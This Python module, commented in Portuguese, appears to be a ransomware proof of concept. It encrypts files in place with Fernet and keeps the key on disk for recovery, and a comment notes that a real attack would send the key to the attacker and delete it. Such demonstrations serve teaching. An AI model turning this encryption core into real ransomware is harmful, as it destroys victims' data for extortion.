from cryptography.fernet import Fernet
import os

KEY_FILE = "chave_mestra.key"

def load_or_generate_key():
    """
    Carrega a chave existente ou gera uma nova se não existir.
    Em um ataque real, essa chave seria enviada para o hacker e deletada do PC.
    Aqui, mantemos ela salva para garantir a recuperação.
    """
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as kf:
            key = kf.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as kf:
            kf.write(key)
    return key

def encrypt_file(file_path, key):
    """
    Abre o arquivo, lê os dados, criptografa com AES (via Fernet)
    e sobrescreve o arquivo original.
    """
    f = Fernet(key)
    
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        
        encrypted_data = f.encrypt(file_data)
        
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
            
        print(f"[TRAVADO] {file_path}")
        return True
        
    except Exception as e:
        print(f"[ERRO] Falha ao criptografar {file_path}: {e}")
        return False

def decrypt_file(file_path, key):
    """
    Reverte o processo para provar o conceito de recuperação.
    """
    f = Fernet(key)
    
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
            
        decrypted_data = f.decrypt(encrypted_data)
        
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
            
        print(f"[LIBERADO] {file_path}")
        return True
    except Exception as e:
        print(f"[ERRO] Falha ao descriptografar {file_path}: {e}")
        return False